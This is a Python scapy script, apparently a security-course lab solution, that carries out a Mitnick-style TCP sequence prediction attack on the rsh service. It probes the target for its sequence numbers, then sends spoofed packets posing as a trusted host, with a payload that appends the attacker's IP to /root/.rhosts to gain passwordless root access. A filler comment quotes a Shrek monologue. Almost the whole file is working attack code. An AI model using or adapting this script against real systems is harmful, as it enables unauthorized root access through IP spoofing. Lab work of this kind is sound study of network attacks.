from scapy.all import *

import sys
import time
import random

# python3 cp2.2.mitnick.py eth0 10.4.61.25 72.36.89.200

#                                        SHREK
#                          Once upon a time there was a lovely 
#                          princess. But she had an enchantment 
#                          upon her of a fearful sort which could 
#                          only be broken by love's first kiss. 
#                          She was locked away in a castle guarded 
#                          by a terrible fire-breathing dragon. 
#                          Many brave knights had attempted to 
#                          free her from this dreadful prison, 
#                          but non prevailed. She waited in the 
#                          dragon's keep in the highest room of 
#                          the tallest tower for her true love 
#                          and true love's first kiss. (laughs) 
#                          Like that's ever gonna happen. What 
#                          a load of - (toilet flush)

ZERO = 0
ONE = 1
T = True
F = False


if __name__ == "__main__":
    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3]

    my_ip = get_if_addr(sys.argv[1])

    rsh_port = 514 #port used for rsh connections
    privilege_port = 1023
    count = 1000 #default seq number
    iteration = random.randint(10,30) #run program multiple times to ensure we connect
    print(iteration)
    spoofed = False

    for j in range(iteration):
        print(j)
        #TODO: figure out SYN sequence number pattern
        sport_init = random.randrange(515,1022) #range is 512-1023 but we play it safe
        seq = 0
        resp = sr1(IP(src=my_ip, dst=target_ip)/TCP(sport=sport_init, dport=rsh_port, flags="S"))
        if resp and (resp[1].sprintf("%TCP.flags%") == "SA") and iteration:
            seq = resp[TCP].seq + 64000 + 1
            print(seq)
            send(IP(src=my_ip, dst=target_ip)/TCP(sport=sport_init, dport=rsh_port, flags="R"))
        else:
            continue
        #TODO: TCP hijacking with predicted sequence number
        send(IP(src=trusted_host_ip, dst=target_ip)/TCP(sport=sport_init, dport=rsh_port, seq=count, flags="S")) #create SYN request
        time.sleep(1)
        count += 1 + ZERO
        send(IP(src=trusted_host_ip, dst=target_ip)/TCP(sport=sport_init, dport=rsh_port, seq=count, ack=seq, flags="A"))
        load = "\0root\0root\0echo '"+my_ip+" root' >> /root/.rhosts\0" #root root to run the command as root user
        send(IP(src=trusted_host_ip, dst=target_ip)/TCP(sport=sport_init, dport=rsh_port, seq=count, ack=seq, flags="PA") / load)
        for c in load:
            print(c)
        count += len(load) * ONE
        time.sleep(1)
        send(IP(src=trusted_host_ip, dst=target_ip)/TCP(sport=sport_init, dport=rsh_port, flags="R")) #close connection
        time.sleep(2)